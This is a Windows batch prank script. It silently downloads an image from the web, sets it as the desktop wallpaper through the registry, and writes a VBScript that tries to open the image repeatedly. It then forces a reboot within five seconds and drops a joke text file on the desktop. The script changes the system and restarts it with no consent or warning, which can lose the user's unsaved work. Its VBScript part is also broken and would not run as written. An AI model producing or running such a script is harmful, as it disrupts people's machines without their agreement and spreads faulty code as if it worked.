@echo off
setlocal

set "image_url=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSCV6qQJQSarzA33VS0l8y_9-oQhX7WkJXLsg&s"
set "image_path=%TEMP%\downloaded_image.jpg"

powershell -Command "Invoke-WebRequest -Uri %image_url% -OutFile %image_path%"

reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%image_path%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\custom_windows.vbs"
echo Set objShell = CreateObject("Shell.Application") >> "%TEMP%\custom_windows.vbs"
echo Set imgFile = "%image_path%" >> "%TEMP%\custom_windows.vbs"
echo Randomize >> "%TEMP%\custom_windows.vbs"
echo For i = 1 To 20 >> "%TEMP%\custom_windows.vbs"
echo     XPos = Int((Screen.Width - 300) * Rnd) >> "%TEMP%\custom_windows.vbs"
echo     YPos = Int((Screen.Height - 300) * Rnd) >> "%TEMP%\custom_windows.vbs"
echo     Set objWindow = objShell.ShellExecute imgFile, "", "", "open", 1 >> "%TEMP%\custom_windows.vbs"
echo     WScript.Sleep 500 >> "%TEMP%\custom_windows.vbs"
echo Next >> "%TEMP%\custom_windows.vbs"

cscript //nologo "%TEMP%\custom_windows.vbs"
shutdown /r /t 5
echo hello skibidi > "%userprofile%\Desktop\hello_skibidi.txt"
